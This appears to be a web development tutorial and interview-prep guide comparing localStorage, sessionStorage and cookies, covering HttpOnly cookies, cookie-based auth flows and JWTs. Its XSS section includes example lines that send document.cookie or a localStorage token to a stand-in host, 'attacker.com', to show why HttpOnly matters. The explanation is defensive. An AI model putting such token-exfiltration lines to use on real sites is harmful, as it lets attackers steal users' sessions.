# Local Storage vs Session Storage vs Cookies

## Table of Contents

- [What is Local Storage?](#what-is-local-storage)
- [What is Session Storage?](#what-is-session-storage)
- [What are Cookies?](#what-are-cookies)
- [Comparison Table](#comparison-table)
- [When to Use What?](#when-to-use-what)
- [Code Examples](#code-examples)
- [Advantages & Limitations](#advantages--limitations)
- [HttpOnly Cookies — Deep Dive](#httponly-cookies--deep-dive)
- [How Auth Flows Across API Calls](#how-auth-flows-across-api-calls)
- [JWT (JSON Web Token) — Deep Dive](#jwt-json-web-token--deep-dive)
- [Common Interview Questions](#common-interview-questions)
- [Interview One-Liners](#interview-one-liners)
- [Summary](#summary)

---

# What is Local Storage?

## Definition

> **Local Storage is a browser storage mechanism that stores data with no expiration date until it is explicitly removed by the application or the user.**

## Features

- Storage Limit: **~5-10 MB**
- Persists even after browser restart.
- Shared across all tabs of the same origin.
- Data is stored as **key-value pairs**.
- Accessible only from JavaScript.

---

# What is Session Storage?

## Definition

> **Session Storage stores data only for the duration of the current browser tab or window.**

## Features

- Storage Limit: **~5 MB**
- Cleared when the tab or browser window is closed.
- Each tab has its own separate storage.
- Data is stored as key-value pairs.
- Accessible only from JavaScript.

---

# What are Cookies?

## Definition

> **Cookies are small pieces of data stored by the browser that are automatically sent to the server with every HTTP request.**

## Features

- Storage Limit: **~4 KB**
- Can have an expiration date.
- Automatically included in HTTP requests.
- Can be configured as:
  - HttpOnly
  - Secure
  - SameSite

---

# Comparison Table

| Feature | Local Storage | Session Storage | Cookies |
|----------|--------------|----------------|----------|
| Storage Limit | ~5-10 MB | ~5 MB | ~4 KB |
| Expiration | Never (until removed) | Tab close | Configurable |
| Shared Across Tabs | ✅ Yes | ❌ No | ✅ Yes |
| Sent to Server | ❌ No | ❌ No | ✅ Yes |
| Accessible by JavaScript | ✅ Yes | ✅ Yes | ✅ Yes (unless HttpOnly) |
| Survives Browser Restart | ✅ Yes | ❌ No | Depends on expiry |
| Best For | Persistent client data | Temporary session data | Authentication & server communication |

---

# When to Use What?

## Use Local Storage

- Theme preference
- Language preference
- User settings
- Recently viewed items
- Shopping cart (optional)

Example

```text
Dark Theme

Language

Sidebar State
```

---

## Use Session Storage

- Multi-step forms
- Temporary filters
- Wizard progress
- OTP verification flow
- Temporary search state

Example

```text
Current Step

Search Filters

Draft Form
```

---

## Use Cookies

- Authentication tokens
- Session IDs
- User preferences needed by the server
- CSRF protection

Example

```text
Session ID

JWT (HttpOnly)

Authentication
```

---

# Code Examples

## Local Storage

Store

```javascript
localStorage.setItem("username", "Vipul");
```

Read

```javascript
const name = localStorage.getItem("username");
```

Remove

```javascript
localStorage.removeItem("username");
```

Clear

```javascript
localStorage.clear();
```

---

## Session Storage

Store

```javascript
sessionStorage.setItem("username", "Vipul");
```

Read

```javascript
const name = sessionStorage.getItem("username");
```

Remove

```javascript
sessionStorage.removeItem("username");
```

Clear

```javascript
sessionStorage.clear();
```

---

## Cookies

Create

```javascript
document.cookie = "username=Vipul";
```

With Expiry

```javascript
document.cookie =
  "username=Vipul; expires=Fri, 31 Dec 2027 23:59:59 GMT";
```

Read

```javascript
console.log(document.cookie);
```

---

# Advantages & Limitations

## Local Storage

### Advantages

- Large storage capacity.
- Persistent.
- Easy API.

### Limitations

- Not secure for sensitive data.
- Accessible through JavaScript.
- Vulnerable to XSS attacks.

---

## Session Storage

### Advantages

- Data automatically removed after tab closes.
- Isolated per browser tab.

### Limitations

- Lost after closing the tab.
- Not suitable for persistent data.

---

## Cookies

### Advantages

- Automatically sent to the server.
- Can be secured using HttpOnly and Secure flags.
- Suitable for authentication.

### Limitations

- Small storage size.
- Sent with every request, increasing network traffic.

---

# HttpOnly Cookies — Deep Dive

## What is an HttpOnly Cookie?

> **An HttpOnly cookie is a cookie with the `HttpOnly` flag, which tells the browser to hide it from client-side JavaScript. It can only be accessed by the server over HTTP(S).**

The main effect: `document.cookie` **cannot read or write** it. It is invisible to JS entirely, which protects it from being stolen via XSS.

---

## Only the Server Can Set It

JavaScript **cannot** create an HttpOnly cookie. It must be set by the server using the `Set-Cookie` response header.

### Server sets the cookie (response header)

```text
Set-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Strict
```

### Example: Express / Node.js backend

```javascript
app.post("/login", (req, res) => {
  // ...validate user...

  res.cookie("sessionId", "abc123", {
    httpOnly: true,   // JS cannot read this cookie
    secure: true,     // only sent over HTTPS
    sameSite: "strict", // mitigates CSRF
    maxAge: 1000 * 60 * 60 * 24, // 1 day
  });

  res.json({ message: "Logged in" });
});
```

---

## JavaScript Cannot Access It

```javascript
// A normal cookie — readable by JS
document.cookie = "theme=dark";
console.log(document.cookie); // "theme=dark"  ✅ visible

// An HttpOnly cookie (set by the server)
// Set-Cookie: sessionId=abc123; HttpOnly
console.log(document.cookie); // "theme=dark"  ❌ sessionId is NOT here

// Trying to read it directly also fails
const getCookie = (name) =>
  document.cookie
    .split("; ")
    .find((row) => row.startsWith(name + "="));

console.log(getCookie("sessionId")); // undefined  ❌ hidden from JS
```

> Even though JS can't see it, the browser **still sends it automatically** to the server on every matching request.

---

## It Is Still Sent to the Server Automatically

You do **not** attach it manually. The browser includes it in the `Cookie` request header for every request to the same origin.

```javascript
// No token handling needed on the client —
// the browser attaches the HttpOnly cookie automatically.
fetch("/api/profile", {
  method: "GET",
  credentials: "include", // required to send cookies (esp. cross-origin)
})
  .then((res) => res.json())
  .then((data) => console.log(data));
```

The outgoing request automatically contains:

```text
GET /api/profile
Cookie: sessionId=abc123
```

---

## Why It Matters — XSS Protection

If a token is stored where JavaScript can read it (normal cookie or `localStorage`), an XSS attack can steal it:

### Vulnerable (token readable by JS)

```javascript
// Malicious script injected via XSS
fetch("https://attacker.com/steal?token=" + document.cookie);
// or
fetch("https://attacker.com/steal?token=" + localStorage.getItem("token"));
```

### Protected (HttpOnly)

```javascript
// Same malicious script, but the cookie is HttpOnly
fetch("https://attacker.com/steal?token=" + document.cookie);
// document.cookie does NOT contain sessionId → nothing to steal ✅
```

---

## Important Nuance: HttpOnly ≠ CSRF Protection

> HttpOnly stops **token theft via XSS**, but it does **not** stop **CSRF**.

Because the browser sends HttpOnly cookies automatically, an attacker's site can still *trigger* authenticated requests (they can't read the cookie, but the browser attaches it). That's why HttpOnly is combined with other flags:

| Flag | What it does | Protects against |
|------|--------------|------------------|
| `HttpOnly` | Blocks JavaScript access | **XSS** token theft |
| `Secure` | Only sent over HTTPS | Network interception |
| `SameSite=Strict/Lax` | Restricts cross-site sending | **CSRF** |

### Recommended combination for auth tokens

```text
Set-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Strict; Path=/; Max-Age=86400
```

---

## HttpOnly Cookie vs localStorage for Tokens

| | HttpOnly Cookie | localStorage |
|---|---|---|
| Readable by JS | ❌ No (safe from XSS theft) | ✅ Yes (vulnerable to XSS) |
| Sent to server | ✅ Automatically | ❌ Manual (attach header yourself) |
| CSRF risk | ⚠️ Yes (needs `SameSite`) | ✅ No (not auto-sent) |
| Best for | **Auth tokens / session IDs** | Non-sensitive UI state (theme, etc.) |

**Bottom line:** For authentication tokens, an `HttpOnly; Secure; SameSite` cookie is the recommended, safer choice over `localStorage`.

---

# How Auth Flows Across API Calls

> **The core idea:** You don't manually pass anything. The browser automatically attaches the cookie to every request, and the backend validates it on each call. HTTP is stateless — the cookie is what makes it feel stateful.

## The Full Flow

```text
1. LOGIN
   Browser  ──POST /login {email, password}──►  Server
                                                 │ validates credentials
                                                 │ creates a session / token
   Browser  ◄──Set-Cookie: sessionId=abc123───  Server
   │
   │ Browser stores the cookie automatically
   ▼
2. NEXT API CALL (e.g. GET /profile)
   Browser  ──GET /profile─────────────────────►  Server
            Cookie: sessionId=abc123              │ reads cookie
            (browser attaches it AUTOMATICALLY)   │ looks up who abc123 is
   Browser  ◄──200 { user data }───────────────  Server
```

After login, **every subsequent request to the same origin automatically includes the cookie**. You never write code to "pass" it.

---

## Step 1 — Login Sets the Identity

```javascript
// SERVER (Express)
app.post("/login", (req, res) => {
  const user = validateUser(req.body.email, req.body.password);
  if (!user) return res.status(401).json({ error: "Invalid credentials" });

  // Create a session id (or a JWT) that represents this user
  const sessionId = createSession(user.id); // e.g. store { abc123 -> userId }

  res.cookie("sessionId", sessionId, {
    httpOnly: true,
    secure: true,
    sameSite: "strict",
  });

  res.json({ message: "Logged in" });
});
```

---

## Step 2 — The Next API Call: What to Pass & How

**You pass nothing manually.** The browser does it. Your only job is to allow cookies to be sent.

```javascript
// CLIENT
// Same-origin fetch → cookie is sent automatically
fetch("/api/profile").then((res) => res.json());

// Cross-origin (different domain) → you MUST opt in
fetch("https://api.myapp.com/profile", {
  credentials: "include", // tells browser to attach cookies
});
```

With **axios**:

```javascript
axios.get("/api/profile", { withCredentials: true });
```

The outgoing request automatically carries:

```text
GET /api/profile
Cookie: sessionId=abc123
```

---

## Step 3 — How the Backend Knows You're Logged In

The server reads the cookie from the incoming request and looks up **who it belongs to** — on every request.

```javascript
// SERVER — auth middleware runs before protected routes
function requireAuth(req, res, next) {
  const sessionId = req.cookies.sessionId; // read the cookie

  if (!sessionId) {
    return res.status(401).json({ error: "Not logged in" });
  }

  const session = lookupSession(sessionId); // find { abc123 -> userId }
  if (!session) {
    return res.status(401).json({ error: "Invalid or expired session" });
  }

  req.user = session.user; // attach identity to the request
  next(); // allowed → continue
}

app.get("/api/profile", requireAuth, (req, res) => {
  res.json({ profile: req.user }); // server already knows who you are
});
```

The backend doesn't "remember that login happened" as an event. Instead, **each request proves its own identity** by carrying the cookie, and the server validates it every single time.

---

## Session ID vs JWT — What's Inside the Cookie

| | **Session ID** (stateful) | **JWT** (stateless) |
|---|---|---|
| Cookie holds | A random opaque id (`abc123`) | The whole signed token with user data |
| Server verifies by | Looking it up in DB/Redis | Verifying the cryptographic signature |
| Logout | Delete session from store | Harder (token valid until expiry) |
| Scales across servers | Needs shared session store | No lookup needed |

---

## Alternative: Authorization Header (Token in JS)

If you store a token in `localStorage` instead (not HttpOnly), the browser does **not** auto-send it — you attach it manually on every call.

```javascript
// CLIENT — you pass it explicitly
const token = localStorage.getItem("token");

fetch("/api/profile", {
  headers: {
    Authorization: `Bearer ${token}`,
  },
});
```

```javascript
// SERVER reads it from the header instead of the cookie
const token = req.headers.authorization?.split(" ")[1]; // "Bearer xxx"
const user = verifyJwt(token);
```

### Trade-off Summary

| Approach | How token is passed | XSS | CSRF |
|----------|--------------------|-----|------|
| **HttpOnly cookie** | Browser sends automatically | ✅ Safe | ⚠️ Needs `SameSite` |
| **`Authorization: Bearer` + localStorage** | You attach manually | ⚠️ Vulnerable | ✅ Safe |

---

# JWT (JSON Web Token) — Deep Dive

## What is a JWT?

> **A JWT is a self-contained, digitally signed token that carries the user's data *inside itself*.**

The key contrast with a session ID:

```text
SESSION ID:  cookie holds "abc123"  → real data lives on the SERVER (Redis/DB)
JWT:         cookie/header holds the WHOLE token → real data lives INSIDE the token
             → server stores NOTHING; it just verifies the signature
```

That's why JWT is called **stateless** — no server-side session store needed.

---

## Structure — 3 Parts Separated by Dots

```text
eyJhbGciOiJIUzI1NiJ9.eyJ1c2VySWQiOjQyLCJyb2xlIjoiYWRtaW4ifQ.SflKxwRJSMeKKF2QT4
└──────── HEADER ────────┘ └──────────── PAYLOAD ────────────┘ └──── SIGNATURE ────┘
```

Each part is **Base64Url-encoded**.

### 1. Header — algorithm + type

```json
{ "alg": "HS256", "typ": "JWT" }
```

### 2. Payload — the "claims" (the actual data)

```json
{
  "userId": 42,
  "role": "admin",
  "iat": 1700000000,
  "exp": 1700086400
}
```

### 3. Signature — proves the token wasn't tampered with

```text
HMACSHA256(
  base64Url(header) + "." + base64Url(payload),
  SECRET_KEY
)
```

---

## Critical Point: JWT is Signed, NOT Encrypted

```text
✅ Signed    = anyone can READ the payload, but nobody can CHANGE it without the secret
❌ Encrypted = payload is hidden
```

Anyone can paste a JWT into [jwt.io](https://jwt.io) and read the payload — it's just Base64, not secret.

> **Never put sensitive data (passwords, card numbers) in a JWT payload.**

The security is in the **signature**: if an attacker changes `"role": "user"` to `"role": "admin"`, the signature no longer matches (they don't have the secret key), and the server rejects it.

---

## How It Works — The Flow

```text
1. LOGIN
   Client ──POST /login {email, password}──►  Server
                                              │ validates
                                              │ creates + SIGNS a JWT with secret
   Client ◄──── JWT (eyJhbGc...) ───────────  Server
   │ client stores it (cookie or localStorage)
   ▼
2. NEXT API CALL
   Client ──GET /profile + JWT──────────────►  Server
                                              │ VERIFIES signature with secret
                                              │ reads payload → userId 42
                                              │ (NO database lookup!)
   Client ◄──── 200 { data } ───────────────  Server
```

---

## Code

### Sign (login)

```javascript
import jwt from "jsonwebtoken";

app.post("/login", (req, res) => {
  const user = validateUser(req.body.email, req.body.password);
  if (!user) return res.status(401).json({ error: "Invalid credentials" });

  const token = jwt.sign(
    { userId: user.id, role: user.role }, // payload
    process.env.JWT_SECRET,               // secret key
    { expiresIn: "1d" }                   // exp claim
  );

  res.json({ token });
});
```

### Verify (protected route)

```javascript
function requireAuth(req, res, next) {
  const token = req.headers.authorization?.split(" ")[1]; // "Bearer xxx"
  if (!token) return res.status(401).json({ error: "No token" });

  try {
    const decoded = jwt.verify(token, process.env.JWT_SECRET); // throws if tampered/expired
    req.user = decoded; // { userId: 42, role: "admin" }
    next();
  } catch {
    return res.status(401).json({ error: "Invalid or expired token" });
  }
}
```

---

## Session ID vs JWT

| | **Session ID** (stateful) | **JWT** (stateless) |
|---|---|---|
| What's stored client-side | A random pointer (`abc123`) | The whole signed token |
| Server-side storage | ✅ Required (Redis/DB) | ❌ None |
| Verify by | DB/Redis lookup | Signature check (fast, no lookup) |
| Scales across servers | Needs shared store | Trivial (any server can verify) |
| **Logout / revoke** | ✅ Easy (delete from store) | ❌ Hard (valid until `exp`) |
| Size | Tiny | Larger (sent on every request) |

---

## The Big JWT Weakness — Revocation

> **You can't easily revoke a JWT.** Once issued, it's valid until it expires — even if the user logs out or you ban them.

Because there's no server-side store to delete from, common mitigations are:

- **Short-lived access tokens** (e.g. 15 min) + a long-lived **refresh token**.
- A server-side **blocklist** of revoked token IDs (`jti`) — but this reintroduces state, partially defeating the "stateless" benefit.

---

## Where to Store the JWT

Same rules as any auth token:

- **HttpOnly cookie** → safe from XSS theft, but guard CSRF with `SameSite`.
- **localStorage + `Authorization: Bearer`** → immune to CSRF, but vulnerable to XSS.

---

# Common Interview Questions

## Which one is most secure?

**Cookies (HttpOnly + Secure)**

Reason:

JavaScript cannot access HttpOnly cookies.

---

## Where should JWT be stored?

Preferred:

- **HttpOnly Secure Cookie**

Avoid storing authentication tokens in Local Storage when security is a concern because they can be accessed through JavaScript if an XSS vulnerability exists.

---

## Which storage survives browser restart?

✅ Local Storage

✅ Cookies (if not expired)

❌ Session Storage

---

## Which storage is shared between tabs?

| Storage | Shared Across Tabs |
|----------|-------------------|
| Local Storage | ✅ Yes |
| Session Storage | ❌ No |
| Cookies | ✅ Yes |

---

## Which storage is automatically sent to the server?

✅ Cookies

---

## Which storage has the largest capacity?

```
Local Storage

↓

Session Storage

↓

Cookies
```

---

## Can Local Storage store objects?

Not directly.

Objects must be converted to JSON.

Store

```javascript
const user = {
  name: "Vipul",
  age: 29
};

localStorage.setItem(
  "user",
  JSON.stringify(user)
);
```

Read

```javascript
const user = JSON.parse(
  localStorage.getItem("user")
);
```

---

# Interview One-Liners

- Local Storage persists until manually cleared.
- Session Storage is cleared when the browser tab closes.
- Cookies are automatically sent with every HTTP request.
- Cookies support HttpOnly and Secure flags.
- Local Storage and Session Storage store only strings.
- Use `JSON.stringify()` and `JSON.parse()` for objects.
- Avoid storing sensitive data in Local Storage.
- HttpOnly cookies help protect against XSS access.
- Local Storage is shared across tabs of the same origin.
- Session Storage is isolated to a single tab.

---

# Summary

| Storage | Best Use Case |
|----------|---------------|
| Local Storage | User preferences, theme, language, persistent client data |
| Session Storage | Temporary session data, forms, filters |
| Cookies | Authentication, sessions, server communication |
